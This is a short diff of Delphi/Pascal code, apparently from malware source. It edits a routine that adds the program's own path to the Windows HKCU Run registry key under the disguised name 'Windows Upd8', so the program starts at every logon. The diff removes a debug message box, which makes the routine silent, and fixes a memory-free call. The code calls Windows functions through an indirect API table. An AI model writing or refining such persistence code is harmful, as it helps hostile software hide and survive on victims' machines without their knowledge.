@@ -41,9 +41,8 @@ begin
   if (pRegValue <> nil) then
   begin
     pAPI.xwsprintfW(pRegValue, '"%s"', strCurrentPath);
-    pAPI.xMessageBoxW(0, pRegValue, nil, 0);
     AddRegKey(pAPI, HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run\', 'Windows Upd8', pRegValue);
-    //pAPI.xFreeMem(pRegValue);
+    pAPI.xFreeMem(pAPI, pRegValue);
   end;
 end;
 
